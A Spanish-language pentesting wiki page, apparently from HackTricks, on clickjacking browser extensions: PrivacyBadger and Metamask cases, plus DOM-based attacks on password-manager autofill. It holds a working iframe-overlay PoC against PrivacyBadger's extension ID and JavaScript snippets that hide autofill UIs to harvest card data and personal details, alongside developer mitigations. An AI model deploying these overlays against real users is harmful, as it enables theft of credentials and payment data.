# BrowExt - ClickJacking

{{#include ../../banners/hacktricks-training.md}}

## Información básica

Esta página va a abusar de una vulnerabilidad de ClickJacking en una extensión de navegador.\
Si no sabes qué es ClickJacking, consulta:

{{#ref}}
../clickjacking.md
{{#endref}}

Extensions contains the file **`manifest.json`** and that JSON file has a field `web_accessible_resources`. Here's what [the Chrome docs](https://developer.chrome.com/extensions/manifest/web_accessible_resources) say about it:

> Estos recursos estarían entonces disponibles en una página web a través de la URL **`chrome-extension://[PACKAGE ID]/[PATH]`**, which can be generated with the **`extension.getURL method`**. Allowlisted resources are served with appropriate CORS headers, so they're available via mechanisms like XHR.[1](https://blog.lizzie.io/clickjacking-privacy-badger.html#fn.1)

Los **`web_accessible_resources`** en una extensión de navegador no solo son accesibles vía la web; también operan con los privilegios inherentes de la extensión. Esto significa que tienen la capacidad de:

- Cambiar el estado de la extensión
- Cargar recursos adicionales
- Interactuar con el navegador en cierta medida

Sin embargo, esta funcionalidad presenta un riesgo de seguridad. Si un recurso dentro de **`web_accessible_resources`** tiene alguna funcionalidad significativa, un atacante podría potencialmente embeber ese recurso en una página web externa. Usuarios desprevenidos que visiten esa página podrían activar inadvertidamente ese recurso embebido. Dicha activación podría conllevar consecuencias no deseadas, dependiendo de los permisos y capacidades de los recursos de la extensión.

## Ejemplo de PrivacyBadger

En la extensión PrivacyBadger se identificó una vulnerabilidad relacionada con que el directorio `skin/` estaba declarado como `web_accessible_resources` de la siguiente manera (Consulta el [blog post](https://blog.lizzie.io/clickjacking-privacy-badger.html) original):
```json
"web_accessible_resources": [
"skin/*",
"icons/*"
]
```
Esta configuración dio lugar a un posible problema de seguridad. Específicamente, el archivo `skin/popup.html`, que se renderiza al interactuar con el icono de PrivacyBadger en el navegador, podía ser incrustado dentro de un `iframe`. Dicha incrustación podía explotarse para engañar a los usuarios y hacer que, involuntariamente, hicieran clic en "Disable PrivacyBadger for this Website". Tal acción comprometería la privacidad del usuario al desactivar la protección de PrivacyBadger y podría exponerlo a un mayor seguimiento. Una demostración visual de este exploit puede verse en un ejemplo de vídeo de ClickJacking disponible en [**https://blog.lizzie.io/clickjacking-privacy-badger/badger-fade.webm**](https://blog.lizzie.io/clickjacking-privacy-badger/badger-fade.webm).

Para abordar esta vulnerabilidad se implementó una solución sencilla: la eliminación de `/skin/*` de la lista de `web_accessible_resources`. Este cambio mitigó eficazmente el riesgo al asegurar que el contenido del directorio `skin/` no pudiera ser accedido o manipulado a través de web-accessible resources.

La corrección fue sencilla: **remove `/skin/*` from the `web_accessible_resources`.**

### PoC
```html
<!--https://blog.lizzie.io/clickjacking-privacy-badger.html-->

<style>
iframe {
width: 430px;
height: 300px;
opacity: 0.01;
float: top;
position: absolute;
}

#stuff {
float: top;
position: absolute;
}

button {
float: top;
position: absolute;
top: 168px;
left: 100px;
}
</style>

<div id="stuff">
<h1>Click the button</h1>
<button id="button">click me</button>
</div>

<iframe
src="chrome-extension://ablpimhddhnaldgkfbpafchflffallca/skin/popup.html">
</iframe>
```
## Ejemplo de Metamask

A [**blog post about a ClickJacking in metamask can be found here**](https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9). En este caso, Metamask solucionó la vulnerabilidad comprobando que el protocolo usado para acceder fuese **`https:`** o **`http:`** (no **`chrome:`**, por ejemplo):

<figure><img src="../../images/image (21).png" alt=""><figcaption></figcaption></figure>

**Another ClickJacking fixed** en la extensión de Metamask fue que los usuarios eran capaces de **Click to whitelist** cuando una página era sospechosa de phishing debido a `“web_accessible_resources”: [“inpage.js”, “phishing.html”]`. Como esa página era vulnerable a ClickJacking, un atacante podía abusar mostrando algo normal para que la víctima hiciera clic para whitelistearla sin darse cuenta, y luego volver a la página de phishing que quedará whitelisted.

## Steam Inventory Helper Example

Consulta la siguiente página para ver cómo una **XSS** en una extensión del navegador se encadenó con una vulnerabilidad de **ClickJacking**:


{{#ref}}
browext-xss-example.md
{{#endref}}

---

## DOM-based Extension Clickjacking (Password Manager Autofill UIs)

El clásico extension ClickJacking abusa de `web_accessible_resources` mal configurados para iframizar HTML privilegiado y forzar clics de usuario. Una clase más reciente, DOM-based extension ClickJacking, apunta a los desplegables de autofill inyectados por gestores de contraseñas directamente en el DOM de la página y usa trucos de CSS/DOM para ocultarlos o ocluirlos manteniéndolos clicables. Un clic forzado puede seleccionar un elemento almacenado y rellenar inputs controlados por el atacante con datos sensibles.

### Modelo de amenaza

- El atacante controla una página web (o consigue XSS/toma de subdominio/envenenamiento de cache en un dominio relacionado).
- La víctima tiene una extensión de gestor de contraseñas instalada y desbloqueada (algunos autofill incluso cuando está nominalmente bloqueada).
- Se induce al menos un clic del usuario (banners de cookies superpuestos, diálogos, CAPTCHAs, juegos, etc.).

### Flujo de ataque (autofill manual)

1. Inyectar un formulario invisible pero enfocable (login/PII/credit-card fields).
2. Enfocar un input para invocar el desplegable de autofill de la extensión cerca del campo.
3. Ocultar u ocluir la UI de la extensión manteniéndola interactuable.
4. Alinear un control creíble bajo el desplegable oculto para forzar un clic que seleccione un elemento.
5. Leer los valores rellenados desde el formulario del atacante y exfiltrarlos.

### How to hide the autofill UI

- Extension element
- Root element opacity (generic):
```js
// Reduce or nullify opacity of the extension root
// Works when the root element is attached in the page DOM
const root = document.querySelector('protonpass-root')
if (root) root.style.opacity = 0
```
- Elemento hijo dentro de ShadowRoot abierto (etiqueta dinámica, ocultar iframe interno):
```js
// Find dynamic root like <protonpass-root-xyz> and hide its child iframe
const root = Array.from(document.querySelectorAll('*'))
.find(el => el.tagName.toLowerCase().startsWith('protonpass-root-'))
if (root?.shadowRoot) {
const frame = root.shadowRoot.querySelector('iframe')
if (frame) frame.style.cssText += 'opacity:0 !important;'
}
```
- Elemento padre
- Trucos de BODY/HTML opacity para hacer que extension UI sea invisible mientras la página parece normal (p. ej., fondo de la captura de pantalla):
```js
// Hide full page, then reveal a tiny amount to keep clicks working
document.body.style.opacity = 0
// Optional: Show a screenshot/lookalike to avoid a blank screen
// document.documentElement.style.backgroundImage = 'url(website.png)'

// Inject a credit-card form and focus to trigger dropdown
/* create #cardform with #cardnumber, #expiry, #cvc */
document.getElementById('cardnumber').focus()
// Make body barely visible to allow user interaction
document.body.style.opacity = '0.001'

function getCardValues() {
const num = document.getElementById('cardnumber').value
const exp = document.getElementById('expiry').value
const cvc = document.getElementById('cvc').value
// exfiltrate via XHR/fetch/websocket
}
```
- Superposición
- Superposición parcial: ocultar todo salvo unos pocos píxeles para que el desplegable siga siendo clicable (asegúrate de que la superposición del atacante sea la última en el DOM con el z-index máximo, o usa Top Layer).
- Superposición completa usando pointer-events:none para que los clics pasen al desplegable oculto; mantenla persistente con el Popover API:
```html
<div id="overlay" popover style="pointer-events:none;">Cookie consent</div>
<script>
overlay.showPopover()
// Inject a personal data form and focus to trigger dropdown
/* create #personalform with #name/#email/#phone/... */
document.getElementById('name').focus()
function getData(){ /* read + exfil values on change */ }
</script>
```
### Posicionamiento del clic de la víctima

- Fixed placement: coloca el menú desplegable oculto debajo de un control creíble como “Accept cookies”, “Close” o una casilla de verificación CAPTCHA.
- Follow-mouse: mueve el campo de entrada enfocado bajo el cursor para que el menú desplegable lo siga; vuelve a enfocar periódicamente para que un solo clic en cualquier lugar seleccione un elemento:
```js
const f = document.getElementById('name')
document.addEventListener('mousemove', e => {
personalform.style = `top:${e.pageY-50}px;left:${e.pageX-100}px;position:absolute;`
// some managers hide the dropdown if focus is lost; refocus slowly
setTimeout(() => f.focus(), 100)
})
```
### Impacto y escenarios

- Sitio controlado por el atacante: un clic forzado puede exfiltrar datos de tarjeta de crédito (número/vencimiento/CVC) e información personal (nombre, correo electrónico, teléfono, dirección, fecha de nacimiento (DOB)) que no están limitados por dominio.
- Sitio de confianza con XSS/subdomain takeover/cache poisoning: robo mediante múltiples clics de credenciales (usuario/contraseña) y TOTP, porque muchos gestores autocompletan campos entre subdominios relacionados/dominios padre (p. ej., `*.example.com`).
- Passkeys: si el RP no enlaza los challenges de WebAuthn a la sesión, XSS puede interceptar la assertion firmada; DOM-based clickjacking oculta el aviso de passkey para provocar el clic de confirmación del usuario.

### Limitaciones

- Requiere al menos un clic del usuario y una alineación de píxeles decente (las superposiciones realistas facilitan solicitar clics).
- El bloqueo automático/cierre de sesión reduce las ventanas de explotación; algunos gestores todavía autocompletan mientras están “bloqueados”.

### Mitigaciones para desarrolladores de extensiones

- Renderiza la UI de autofill en la Top Layer (Popover API) o, de otro modo, asegúrate de que esté por encima del apilamiento de la página; evita que sea cubierta por overlays controladas por la página.
- Resiste la manipulación de CSS: prefiere Closed Shadow DOM y monitoriza con `MutationObserver` cambios sospechosos de estilo en las raíces de la UI.
- Detecta overlays hostiles antes de rellenar: enumera otros elementos top-layer/popover, desactiva temporalmente `pointer-events:none` y usa `elementsFromPoint()` para detectar oclusión; cierra la UI si existen overlays.
- Detecta cambios sospechosos de opacidad o estilo en `<body>`/`<html>` tanto antes como después del renderizado.
- Para problemas basados en iframe: delimita estrechamente los `matches` de MV3 `web_accessible_resources` y evita exponer UIs HTML; para HTML inevitable, sirve `X-Frame-Options: DENY` o `Content-Security-Policy: frame-ancestors 'none'`.


## Referencias

- [https://blog.lizzie.io/clickjacking-privacy-badger.html](https://blog.lizzie.io/clickjacking-privacy-badger.html)
- [https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9](https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9)
- [DOM-based Extension Clickjacking (marektoth.com)](https://marektoth.com/blog/dom-based-extension-clickjacking/)

{{#include ../../banners/hacktricks-training.md}}
